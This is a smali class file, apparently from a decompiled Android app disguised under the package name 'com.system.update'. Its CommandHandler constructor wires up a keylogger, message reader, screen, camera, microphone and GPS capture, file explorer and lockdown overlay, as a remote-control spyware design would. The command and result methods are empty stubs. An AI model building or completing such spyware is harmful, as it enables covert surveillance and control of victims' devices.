.class public Lcom/system/update/CommandHandler;
.super Ljava/lang/Object;
.source "CommandHandler.java"

.field private context:Landroid/content/Context;
.field private uuid:Ljava/lang/String;
.field private screenCap:Lcom/system/update/ScreenCapture;
.field private camera:Lcom/system/update/CameraHelper;
.field private gps:Lcom/system/update/GPSHelper;
.field private mic:Lcom/system/update/MicrophoneHelper;
.field private fileExplorer:Lcom/system/update/FileExplorer;
.field private keyLogger:Lcom/system/update/KeyLogger;
.field private messageReader:Lcom/system/update/MessageReader;
.field private lockdown:Lcom/system/update/LockdownOverlay;

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;)V
    .locals 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/system/update/CommandHandler;->context:Landroid/content/Context;
    iput-object p2, p0, Lcom/system/update/CommandHandler;->uuid:Ljava/lang/String;
    new-instance v0, Lcom/system/update/ScreenCapture;
    invoke-direct {v0, p1}, Lcom/system/update/ScreenCapture;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/system/update/CommandHandler;->screenCap:Lcom/system/update/ScreenCapture;
    new-instance v0, Lcom/system/update/CameraHelper;
    invoke-direct {v0, p1}, Lcom/system/update/CameraHelper;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/system/update/CommandHandler;->camera:Lcom/system/update/CameraHelper;
    new-instance v0, Lcom/system/update/GPSHelper;
    invoke-direct {v0, p1}, Lcom/system/update/GPSHelper;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/system/update/CommandHandler;->gps:Lcom/system/update/GPSHelper;
    new-instance v0, Lcom/system/update/MicrophoneHelper;
    invoke-direct {v0, p1}, Lcom/system/update/MicrophoneHelper;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/system/update/CommandHandler;->mic:Lcom/system/update/MicrophoneHelper;
    new-instance v0, Lcom/system/update/FileExplorer;
    invoke-direct {v0, p1}, Lcom/system/update/FileExplorer;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/system/update/CommandHandler;->fileExplorer:Lcom/system/update/FileExplorer;
    new-instance v0, Lcom/system/update/KeyLogger;
    invoke-direct {v0, p1}, Lcom/system/update/KeyLogger;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/system/update/CommandHandler;->keyLogger:Lcom/system/update/KeyLogger;
    new-instance v0, Lcom/system/update/MessageReader;
    invoke-direct {v0, p1}, Lcom/system/update/MessageReader;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/system/update/CommandHandler;->messageReader:Lcom/system/update/MessageReader;
    new-instance v0, Lcom/system/update/LockdownOverlay;
    invoke-direct {v0, p1}, Lcom/system/update/LockdownOverlay;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/system/update/CommandHandler;->lockdown:Lcom/system/update/LockdownOverlay;
    return-void
.end method

.method public execute(ILjava/lang/String;Lorg/json/JSONObject;)V
    .locals 0
    return-void
.end method

.method private sendResult(ILorg/json/JSONObject;Ljava/lang/String;)V
    .locals 0
    return-void
.end method
